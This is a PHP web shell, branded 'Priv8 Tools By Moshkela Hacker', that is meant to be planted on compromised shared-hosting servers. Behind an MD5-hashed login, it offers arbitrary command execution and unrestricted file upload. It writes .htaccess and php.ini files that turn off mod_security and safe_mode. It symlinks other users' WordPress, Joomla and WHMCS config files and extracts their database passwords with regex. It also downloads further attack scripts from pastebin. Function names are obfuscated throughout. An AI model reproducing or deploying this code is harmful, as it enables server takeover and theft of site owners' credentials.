<?php $username = "admin"; $password = "ce245834f602c2099a87e9f0080157ff"; $user = $_POST['user']; $pass = $_POST['pass']; $form = "<form method='POST'>
	<img src='http://a.top4top.net/p_361jiy1.jpg'  style='position:fixed;width:100%;heigth:100%;top:0;left:0;z-index:-9999;' disabled>
	<center>
	<h1>Moshkela Hacker</h1> <br>
	<br><input type='text' name='user'>
	<br>
	<input type='password' name='pass'>
	<br>
	<br><input type='submit' value='Login !'>
	</form></br>";
	session_start();
	if( !isset($_SESSION['sec']) ){
		$_SESSION['sec'] = false; 
	} if(isset($pass)) {
		if($user == $username and md5($pass) == $password) {
			$_SESSION['sec'] = true; } 
		else {
			die( "{$form} <br> Error grin ÑãÒ ÊÚÈíÑí"); } 
	} if(!$_SESSION['sec']): echo $form; exit(); endif;
	if($_GET['log'] == 'out') {
		session_destroy(); } 
		echo "Welcome {$user} | <a href='?log=out'>Logout</a>"; ?>
<head>

<title>Priv8 Tools By Moshkela Hacker</title>
<link rel="icon" href="http://icons.iconarchive.com/icons/iconscity/flags/128/iraq-icon.png">
</head>
<?php set_time_limit(0); error_reporting(0); ?>
<?php ?><html>


<style type="text/css">
html,body{
	background: #f9f9f9;
	padding: 0;
	direction: ltr;
	margin: 0;
}
h1{
	color:#ff0000;
	text-shadow:0 0 5px;
}
h3{
	color:#ff0000;
	text-shadow:0 0 1px;
}
.f{
	color:#666;
	text-shadow: 0 0 5px #00ff00;
	font-size: 20px;
}
a{
	text-decoration: none;
	color:#ff0000;
	text-shadow:0 0 5px;
}
input[type=submit]{
	padding: 9px;
	border:1px solid #ccc;
	background: #f9f9f9;
	border-radius: 2px;
	cursor: pointer;
	color:#000;
	transition: all 0.2s;
}
input[type=submit]:hover{
	box-shadow: 0 0 2px #ff0000;
}
input[type=text]{
	color:#000;	
	border:1px solid #ccc;
	background: #f9f9f9;
	padding: 10px;
	width: 400px;
	transition: all 0.5s;
}	
input[type=text]:focus{
	box-shadow: 0 0 3px #ff0000;
}
hr{
    border: 0;
    height: 2px;
    background: #333;
    background-image: linear-gradient(to right, #FF00FF, #333, #FF00FF);
}}
	</style>
<center>
<hr>
<form method='GET'>

<input type='submit'name='tool' value='Safe Mode' size='10' >
<input type='submit'name='tool' value='Execute' size='10' >
<input type='submit'name='tool' value='Config Killer' size='10' >
<input type='submit'name='tool' value='Symlink' size='10' >
<input type='submit'name='tool' value='Symlink 2' size='10' >
<input type='submit'name='tool' value='Jumping' size='10' >
<input type='submit'name='tool' value='Pass Config' size='10' >
<input type='submit'name='tool' value='Upload' size='10' >
<input type='submit'name='tool' value='Other tools' size='10' >
<input type='submit'name='tool' value='Server Info' size='10' >
<input type='submit'name='tool' value='About' size='10' >


                                        
</h5>

</form>
<hr>
<?php $x73 = "basename"; $x74 = "chdir"; $x75 = "copy"; $x76 = "error_reporting"; $x77 = "eregi"; $x78 = "ereg"; $x79 = "explode"; $x7a = "fclose"; $x7b = "file_get_contents"; $x7c = "file_put_contents"; $x7d = "file"; $x7e = "flush"; $x7f = "fileowner"; $x80 = "fopen"; $x81 = "fwrite"; $x82 = "function_exists"; $x83 = "getcwd"; $x84 = "ini_restore"; $x85 = "ini_get"; $x86 = "is_file"; $x87 = "mail"; $x88 = "mkdir"; $x89 = "mysql_connect"; $x8a = "mysql_fetch_array"; $x8b = "mysql_query"; $x8c = "mysql_select_db"; $x8d = "phpversion"; $x8e = "posix_getpwuid"; $x8f = "preg_match_all"; $x90 = "preg_match"; $x91 = "rand"; $x92 = "set_time_limit"; $x93 = "shell_exec"; $x94 = "strlen"; $x95 = "symlink"; $x96 = "system"; $x97 = "trim"; $x92(0); $x76(0); if ($_REQUEST['tool'] == "Safe Mode") { echo '<h3> Safe Mode Fucker </h3>
<br><form method="POST" action="">
<select name="way">
<option>php.ini</option>
<option>ini.php</option>
<option>htaccess</option>
</select><input name="bypass" type="submit"class="dh" value="Bypass Using"><br>'; if ($_POST['way'] == "htaccess") { x0b(); } elseif ($_POST['way'] == "php.ini") { x0c(); } elseif ($_POST['way'] == "ini.php") { x0d(); } } function x0b() { global $x73, $x74, $x75, $x76, $x77, $x78, $x79, $x7a, $x7b, $x7c, $x7d, $x7e, $x7f, $x80, $x81, $x82, $x83, $x84, $x85, $x86, $x87, $x88, $x89, $x8a, $x8b, $x8c, $x8d, $x8e, $x8f, $x90, $x91, $x92, $x93, $x94, $x95, $x96, $x97; $x2f = $x80($x83() . $x30 . "/.htaccess", "w"); $x81($x2f, "Options +FollowSymLinks 
DirectoryIndex india.htm 

Options All Indexes 
<IfModule mod_security.c> 
SecFilterEngine Off 
SecFilterScanPOST Off 

SecFilterCheckURLEncoding Off 
SecFilterCheckCookieFormat Off 
SecFilterCheckUnicodeEncoding Off 
SecFilterNormalizeCookies Off 
</IfModule> 
SetEnv PHPRC " . $x83() . $x30 . "/php.ini 
suPHP_ConfigPath " . $x83() . $x30 . "/php.ini"); $x7a($x2f); if ($x86($x83() . $x30 . "/.htaccess")) { echo "<Span style='color:#FF00FF;'><strong>.htaccess Created successfully</strong></span><br>"; } else { echo "<strong><Span style='color:#FF00FF;'>I can not create .htaccess</strong></span><br>"; }; } function x0c() { global $x73, $x74, $x75, $x76, $x77, $x78, $x79, $x7a, $x7b, $x7c, $x7d, $x7e, $x7f, $x80, $x81, $x82, $x83, $x84, $x85, $x86, $x87, $x88, $x89, $x8a, $x8b, $x8c, $x8d, $x8e, $x8f, $x90, $x91, $x92, $x93, $x94, $x95, $x96, $x97; $x31 = $x80($x83() . $x30 . "/php.ini", "w"); $x81($x31, "safe_mode = Off 
disable_functions = NONE 
safe_mode_gid = OFF 

open_basedir = OFF"); $x7a($x31); if ($x86($x83() . $x30 . "/php.ini")) { echo "<strong><Span style='color:#FF00FF;'>php.ini Created successfully</strong></span><br>"; } else { echo "<strong><Span style='color:#FF00FF;'>I can not create php.ini</strong></span><br>"; }; } function x0d() { global $x73, $x74, $x75, $x76, $x77, $x78, $x79, $x7a, $x7b, $x7c, $x7d, $x7e, $x7f, $x80, $x81, $x82, $x83, $x84, $x85, $x86, $x87, $x88, $x89, $x8a, $x8b, $x8c, $x8d, $x8e, $x8f, $x90, $x91, $x92, $x93, $x94, $x95, $x96, $x97; $x32 = $x80($x83() . $x30 . "/ini.php", "w"); $x81($x32, '$x84("safe_mode"); 
$x84("open_basedir");'); $x7a($x32); if ($x86($x83() . $x30 . "/ini.php")) { echo "<strong><Span style='color:#FF00FF;'>ini.php Created successfully</strong></span><br>"; } else { echo "<strong><Span style='color:red;'>I can not create ini.php</strong></span><br>"; }; } if ($_REQUEST['tool'] == "Execute") { echo '<h3> Execute </h3>
	<form method="post"> 
<input  name="cmd" /> 
<input type="submit"class="dh" name="go" /> 
</form>'; if ($_POST['go']) { $x4b = $x82("system"); $x4c = $x82("passthru"); $x4d = $x82("shell_exec"); if ($x4b) { echo "<textarea readonly='' cols='90'rows='20'>"; echo $x96($_POST['cmd']); echo '</textarea>'; } if (!$x4b & $x4c) { echo "<textarea readonly='' cols='90'rows='20'>"; echo passthrsu($_POST['cmd']); echo '</textarea>'; } if (!$x4b & !$x4c & $x4d) { echo "<textarea readonly='' cols='90'rows='20'>"; echo $x93($_POST['cmd']); echo '</textarea>'; } } } else if ($_REQUEST['tool'] == "Upload") { echo"<h3>Upload</h3>"; if(isset($_POST['Submit'])){ $filedir = ""; $maxfile = '2000000'; $userfile_name = $_FILES['image']['name']; $userfile_tmp = $_FILES['image']['tmp_name']; if (isset($_FILES['image']['name'])) { $abod = $filedir.$userfile_name; @move_uploaded_file($userfile_tmp, $abod); echo"<center><b><h3> Don3 ==> $userfile_name</h3></b></center>"; } } else{ echo'
<form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit"class="dh" name="Submit" value="up"></form>'; } } else if ($_REQUEST['tool'] == "Config Killer") { echo "<br><center><h3>Config Killer</h3>"; ?></center><br><center><?php if (empty($_POST['config'])) { ?><p><font face="Tahoma" color="#007700" size="2pt"></p><br><form method="POST"><textarea name="passwd" class='area' rows='15' cols='60'><?php echo $x7b('/etc/passwd'); ?></textarea><br><br><input name="config"  size="100" value="GET Config" type="submit"class="dh"><br></form></center><br><?php  } if ($_POST['config']) { $x33 = $x34 = @$x85("disable_functions"); if ($x77("symlink", $x34)) { die('<error>Symlink is disabled frown ÑãÒ ÊÚÈíÑí </error>'); } @$x88('M-Iraq', 0755); @$x74('M-Iraq'); $x2f = "

OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI

Options Indexes FollowSymLinks
ForceType text/plain
AddType text/plain .php 

AddType text/plain .html

AddType text/html .shtml
AddType txt .php
AddHandler server-parsed .php

AddHandler txt .php

AddHandler txt .html

AddHandler txt .shtml

Options All
Options All"; $x7c(".htaccess", $x2f, FILE_APPEND); $x35 = $_POST["passwd"]; $x35 = $x79("
", $x35); foreach ($x35 as $x36) { $x37 = $x79(":", $x36); $x38 = $x37[0]; @$x95('/home/' . $x38 . '/public_html/wp-config.php', $x38 . '-wp13.txt'); @$x95('/home/' . $x38 . '/public_html/wp/wp-config.php', $x38 . '-wp13-wp.txt'); @$x95('/home/' . $x38 . '/public_html/WP/wp-config.php', $x38 . '-wp13-WP.txt'); @$x95('/home/' . $x38 . '/public_html/wp/beta/wp-config.php', $x38 . '-wp13-wp-beta.txt'); @$x95('/home/' . $x38 . '/public_html/beta/wp-config.php', $x38 . '-wp13-beta.txt'); @$x95('/home/' . $x38 . '/public_html/press/wp-config.php', $x38 . '-wp13-press.txt'); @$x95('/home/' . $x38 . '/public_html/wordpress/wp-config.php', $x38 . '-wp13-wordpress.txt'); @$x95('/home/' . $x38 . '/public_html/Wordpress/wp-config.php', $x38 . '-wp13-Wordpress.txt'); @$x95('/home/' . $x38 . '/public_html/blog/wp-config.php', $x38 . '-wp13-Wordpress.txt'); @$x95('/home/' . $x38 . '/public_html/config.php', $x38 . '-configgg.txt'); @$x95('/home/' . $x38 . '/public_html/news/wp-config.php', $x38 . '-wp13-news.txt'); @$x95('/home/' . $x38 . '/public_html/new/wp-config.php', $x38 . '-wp13-new.txt'); @$x95('/home/' . $x38 . '/public_html/blog/wp-config.php', $x38 . '-wp-blog.txt'); @$x95('/home/' . $x38 . '/public_html/beta/wp-config.php', $x38 . '-wp-beta.txt'); @$x95('/home/' . $x38 . '/public_html/blogs/wp-config.php', $x38 . '-wp-blogs.txt'); @$x95('/home/' . $x38 . '/public_html/home/wp-config.php', $x38 . '-wp-home.txt'); @$x95('/home/' . $x38 . '/public_html/db.php', $x38 . '-dbconf.txt'); @$x95('/home/' . $x38 . '/public_html/site/wp-config.php', $x38 . '-wp-site.txt'); @$x95('/home/' . $x38 . '/public_html/main/wp-config.php', $x38 . '-wp-main.txt'); @$x95('/home/' . $x38 . '/public_html/configuration.php', $x38 . '-wp-test.txt'); @$x95('/home/' . $x38 . '/public_html/joomla/configuration.php', $x38 . '-joomla2.txt'); @$x95('/home/' . $x38 . '/public_html/portal/configuration.php', $x38 . '-joomla-protal.txt'); @$x95('/home/' . $x38 . '/public_html/joo/configuration.php', $x38 . '-joo.txt'); @$x95('/home/' . $x38 . '/public_html/cms/configuration.php', $x38 . '-joomla-cms.txt'); @$x95('/home/' . $x38 . '/public_html/site/configuration.php', $x38 . '-joomla-site.txt'); @$x95('/home/' . $x38 . '/public_html/main/configuration.php', $x38 . '-joomla-main.txt'); @$x95('/home/' . $x38 . '/public_html/news/configuration.php', $x38 . '-joomla-news.txt'); @$x95('/home/' . $x38 . '/public_html/new/configuration.php', $x38 . '-joomla-new.txt'); @$x95('/home/' . $x38 . '/public_html/home/configuration.php', $x38 . '-joomla-home.txt'); @$x95('/home/' . $x38 . '/public_html/vb/includes/config.php', $x38 . '-vb-config.txt'); @$x95('/home/' . $x38 . '/public_html/whm/configuration.php', $x38 . '-whm15.txt'); @$x95('/home/' . $x38 . '/public_html/central/configuration.php', $x38 . '-whm-central.txt'); @$x95('/home/' . $x38 . '/public_html/whm/whmcs/configuration.php', $x38 . '-whm-whmcs.txt'); @$x95('/home/' . $x38 . '/public_html/whm/WHMCS/configuration.php', $x38 . '-whm-WHMCS.txt'); @$x95('/home/' . $x38 . '/public_html/whmc/WHM/configuration.php', $x38 . '-whmc-WHM.txt'); @$x95('/home/' . $x38 . '/public_html/whmcs/configuration.php', $x38 . '-whmcs.txt'); @$x95('/home/' . $x38 . '/public_html/support/configuration.php', $x38 . '-support.txt'); @$x95('/home/' . $x38 . '/public_html/configuration.php', $x38 . '-joomla.txt'); @$x95('/home/' . $x38 . '/public_html/submitticket.php', $x38 . '-whmcs2.txt'); @$x95('/home/' . $x38 . '/public_html/whm/configuration.php', $x38 . '-whm.txt'); } echo '<b class="cone"><font face="Tahoma" color="#FF00FF" size="2pt"><b>[M-IRAQ] -></b> <a target="_blank" href="M-Iraq">Open configs</a></font></b>'; } } else if ($_REQUEST['tool'] == "Symlink") { echo "<h3>Symlink Bypass </h3>"; echo '<form action="" method="post">'; @$x92(0); echo "<center>"; @$x88('m-iraq', 0777); $x2f = "Options Indexes FollowSymLinks
DirectoryIndex ssssss.htm
AddType txt .php
AddHandler txt .php
AddType txt .html
AddHandler txt .html
Options all
Options
Options
ReadmeName r.txt"; $x26 = @$x80('m-iraq/.htaccess', 'w'); $x81($x26, $x2f); @$x95('/', 'm-iraq/root'); $x27 = $x73('index.php'); $x28 = @$x7d('/etc/named.conf'); if (!$x28) { echo "<pre ='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; } else { echo "<br><br><div><table border='1' bordercolor='#FF00FF' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>"; foreach ($x28 as $x29) { if ($x77('zone', $x29)) { $x8f('#zone "(.*)"#', $x29, $x2a); $x7e(); if ($x94($x97($x2a[1][0])) > 2) { $x2b = $x8e(@$x7f('/etc/valiases/' . $x2a[1][0])); $x2c = $x2b['name']; @$x95('/', 'm-iraq/root'); $x2c = $x2a[1][0]; $x2d = '\.sa'; $x2e = '\.il'; $x1e = '\.id'; $x1f = '\.sg'; $x20 = '\.edu'; $x21 = '\.gov'; $x22 = '\.go'; $x23 = '\.gob'; $x24 = '\.mil'; $x25 = '\.mi'; if ($x77("$x2d", $x2a[1][0]) or $x77("$x2e", $x2a[1][0]) or $x77("$x1e", $x2a[1][0]) or $x77("$x1f", $x2a[1][0]) or $x77("$x20", $x2a[1][0]) or $x77("$x21", $x2a[1][0]) or $x77("$x22", $x2a[1][0]) or $x77("$x23", $x2a[1][0]) or $x77("$x24", $x2a[1][0]) or $x77("$x25", $x2a[1][0])) { $x2c = "<div style=' color: #FF00FF ; text-shadow: 0px 0px 1px red; '>" . $x2a[1][0] . '</div>'; } echo "
<tr>
<td>
<div class='dom'><a target='_blank' href=http://www." . $x2a[1][0] . '/>' . $x2c . ' </a> </div>
</td>
<td>
' . $x2b['name'] . "
</td>

<td>
<a href='m-iraq/root/home/" . $x2b['name'] . "/public_html' target='_blank'>Symlink </a>
</td>
</tr></div> "; } } } } echo "</table>"; } else if ($_REQUEST['tool'] == "Symlink 2") { echo '
<h3>Symlink-2</h3>
<FORM ACTION="#" METHOD="POST">
<br>
<br>
<center> <font size="2" face="MV Boli" color=rgba(1, 44, 221, 0.9) ></font> <INPUT TYPE="text" NAME="user"placeholder="/home/user/public_html/config.php" SIZE=60><INPUT TYPE="submit"class="dh" VALUE="Sym"> </center>
</FORM>'; $x4e = $_POST["user"]; $x4f = '' . $x91() . '.txt'; if ($x4e) { $x50 = $x91(); @$x88($x50); $x51 = $x50 . "/.htaccess"; $x52 = $x80($x51, 'w') or die("Error: Can't open file"); $x53 = 'Options +Indexes
ReadMeName ' . $x4f; $x81($x52, $x53); $x7a($x52); $x74($x50); $x95($x4e, $x4f); $x74("../"); echo "<center><iframe height ='500px' width='100%' src=" . $x50 . "></iframe></center>"; } } else if ($_REQUEST['tool'] == "Pass Config") { echo"<h3>Get Password in Config</h3>"; echo '<form method="post">
<input type="text" name="conf" value="" />
<input type="submit"class="dh"value="GeT Passwords" name="get" />
</form>'; $x39 = $_POST['get']; $x3a = $_POST['conf']; if (isset($x39) && $x3a != "") { $x3b = @$x7b($x3a); $x8f('#href="(.*?)"#', $x3b, $x3c); foreach ($x3c[1] as $x3d) { $x3e = $x3a . $x3d; $x3f = @$x7b($x3e); $x90('#\'DB_PASSWORD\', \'(.*)\'#', $x3f, $x40); $x90('#password = \'(.*)\'#', $x3f, $x41); $x90('#password\'] = \'(.*)\'#', $x3f, $x42); $x90('#db_password = "(.*)"#', $x3f, $x43); $x90('#db_password = \'(.*)\'#', $x3f, $x43); $x90('#dbpass = "(.*)"#', $x3f, $x44); $x90('#password	= \'(.*)\'#', $x3f, $x45); $x90('#dbpasswd = \'(.*)\'#', $x3f, $x46); $x90('#password_localhost = "(.*)"#', $x3f, $x47); $x90('#senha = "(.*)"#', $x3f, $x48); if (!empty($x40[1])) { echo $x40[1] . "<br>"; } elseif (!empty($x41[1])) { echo $x41[1] . "<br>"; } elseif (!empty($x42[1])) { echo $x42[1] . "<br>"; } elseif (!empty($x43[1])) { echo $x43[1] . "<br>"; } elseif (!empty($x44[1])) { echo $x44[1] . "<br>"; } elseif (!empty($x45[1])) { echo $x45[1] . "<br>"; } elseif (!empty($x49[1])) { echo $x49[1] . "<br>"; } elseif (!empty($x46[1])) { echo $x46[1] . "<br>"; } elseif (!empty($x47[1])) { echo $x47[1] . "<br>"; } elseif (!empty($x48[1])) { echo $x48[1] . "<br>"; } } } } else if ($_REQUEST['tool'] == "Jumping") { echo"<h3>Jumping</h3>"; $x26 = "array_push"; $x27 = "feof"; $x28 = "fgets"; $x29 = "fopen"; $x2a = "ini_get"; $x2b = "is_readable"; $x2c = "set_time_limit"; $x2d = "strpos"; $x2e = "substr"; ($x2f = $x2a('safe_mode') == 0) ? $x2f = 'off' : die('<b>Error: Safe Mode is On</b>'); $x2c(0); @$x30 = $x29('/etc/passwd', 'r'); if (!$x30) { die('<b><font face=Verdana size=2 color=#FF00FF> Error : Can Not Read Config Of Server </b>'); } $x31 = array(); $x32 = array(); $x33 = array(); $x34 = 0; echo "<b><font face=Verdana size=13 color=#FF00FF>  </font></b><br />"; echo "<br />"; while (!$x27($x30)) { $x35 = $x28($x30); if ($x34 > 35) { $x36 = $x2d($x35, ':'); $x37 = $x2e($x35, 0, $x36); $x38 = '/home/' . $x37 . '/public_html/'; if (($x37 != '')) { if ($x2b($x38)) { $x26($x32, $x37); $x26($x31, $x38); echo "<font face=Verdana size=2 color=#FF00FF> $x38</font>"; echo "<br/>"; } } } $x34++; } } else if ($_REQUEST['tool'] == "About") { echo '
<img src="http://d.top4top.net/p_37rzbl1.png" width="500" height="400" />
<h1> Coded By Moshkela Hacker<br>
                                        
</h1>
<h3>tnx : Mostafa Moshkela </h3>

'; } else if ($_REQUEST['tool'] == "Server Info") { echo"<h3>Server Info</h3>"; $safe = ini_get("safe_mode"); if($safe == 1){ $safe_mode = "<font color=red>ON</font>"; }else{ $safe_mode = "<font color=#FF00FF>OFF</font>"; } $dis = ini_get("disable_functions"); if($dis == ""){ $disable = "<font color=#FF00FF>None</font>"; }else{ $disable = "<font color=red>$dis</font>"; } $uname = php_uname(); $server = $_SERVER['SERVER_ADDR']; $me = $_SERVER['REMOTE_ADDR']; echo "
<div>
<span>
Uname-a : $uname<br>
Safe Mode : $safe_mode<br>
Disable Functions : $disable
</span>
<span class=info2>
<br>Server IP : $server </br>
<br>Your IP : $me </br>
</span>
</div>
"; }else if($_REQUEST['tool'] == "Other tools"){ echo"<h3>Other tools</h3>"; echo'<form method="post">
<b><span style=\"color: rgb(51, 204, 0);\"> Tools  : <b></span><select name="tools" >
<option>Moshkela Hacker Tools</option>
<option>Find Shell</option>
<option>Get Jomla Sites</option>
<option>Get WordPress Sites</option>
<option>Get All Sites Server</option>
<option>1337w0rm</option>
<option>Adminer</option>
<option>Mass Password</option>
</select>
<input type="submit" name="get" value="Get" />
</form>'; if($_POST['get']){ switch($_POST['tools']){ case "Find Shell": if(file_put_contents('Findshell.php',file_get_contents('http://pastebin.com/raw/AR8MzfZV'))){ echo "<center><font color=red size=8>Findshell.php Done !</font></center>"; }; break; case "Get Jomla Sites": if(file_put_contents('jomla.php',file_get_contents('http://pastebin.com/raw/9BQ62rZF'))){ echo "<center><font color=red size=8>jomla.php Done !</font></center>"; } break; case "Get WordPress Sites": if(file_put_contents('wordpress.php',file_get_contents('http://pastebin.com/raw/504iswx3'))){ echo "<center><font color=red size=8>wordpress.php Done !</font></center>"; } break; case "Get All Sites Server": if(file_put_contents('ip.php',file_get_contents('http://pastebin.com/raw/c70btt4r'))){ echo "<center><font color=red size=8>ip.php Done !</font></center>"; } break; case "1337w0rm": if(file_put_contents('1337w0rm.php',file_get_contents('http://pastebin.com/raw/sqK6hVJd'))){ echo "<center><font color=red size=8>1337w0rm.php Done !</font></center>"; } break; case "Adminer": if(file_put_contents('Adminer.php',file_get_contents('http://pastebin.com/raw/BZHXtZqu'))){ echo "<center><font color=red size=8>Adminer.php Done !</font></center>"; } break; case "Mass Password": if(file_put_contents('Masspass.php',file_get_contents('http://pastebin.com/raw/eLv6MUpD'))){ echo "<center><font color=red size=8>Masspass.php Done !</font></center>"; } break; } }} 
?>